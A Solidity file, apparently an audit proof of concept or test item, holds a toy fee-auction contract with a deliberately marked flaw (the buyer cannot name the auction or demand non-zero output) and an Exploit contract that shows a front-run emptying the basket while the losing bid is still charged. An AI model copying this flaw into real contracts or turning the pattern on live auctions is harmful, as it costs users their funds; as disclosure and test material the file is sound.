// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract FeeAuction {
    uint256 public assetBalance;
    uint256 public auctionPrice = 1;
    uint256 public totalPaid;

    constructor() {
        assetBalance = 100;
    }

    function buy() external returns (uint256[] memory balances) {
        balances = new uint256[](1);
        balances[0] = assetBalance;
        // @> VULN: no auction identifier or non-zero-output check is supplied by the buyer.
        totalPaid += auctionPrice;
        if (balances[0] > 0) assetBalance = 0;
        auctionPrice *= 2;
    }
}

contract Exploit {
    FeeAuction public auction;
    uint256 public victimOutput;
    bool public confirmed;

    constructor() {
        auction = new FeeAuction();
    }

    function run() external {
        auction.buy();
        auction.buy();
        victimOutput = auction.assetBalance();
        require(victimOutput == 0, "front-run did not empty basket");
        require(auction.totalPaid() == 3, "losing bid was not charged");
        require(auction.auctionPrice() == 4, "price did not advance");
        confirmed = true;
    }
}

